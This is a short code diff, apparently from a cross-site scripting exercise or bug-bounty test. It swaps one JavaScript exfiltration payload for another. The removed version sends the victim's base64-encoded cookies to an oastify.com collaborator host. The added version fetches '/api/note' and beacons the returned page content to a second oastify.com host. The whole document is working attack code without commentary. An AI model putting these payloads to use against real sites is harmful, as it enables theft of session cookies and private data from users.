@@ -1,4 +1,7 @@
-fetch("https://iaw29a9cu6oomssy6h8cddo8yz4rsg.oastify.com/?cookie="+btoa(document.cookie)).then(x=>{
-
-})
-alert(1)
+fetch('/api/note')
+  .then((response) => {
+    return response.text();
+  })
+  .then((html) => {
+    navigator.sendBeacon("http://4inepx81jwmwwxr8m157oxm86zcq0go5.oastify.com", html) 
+  });
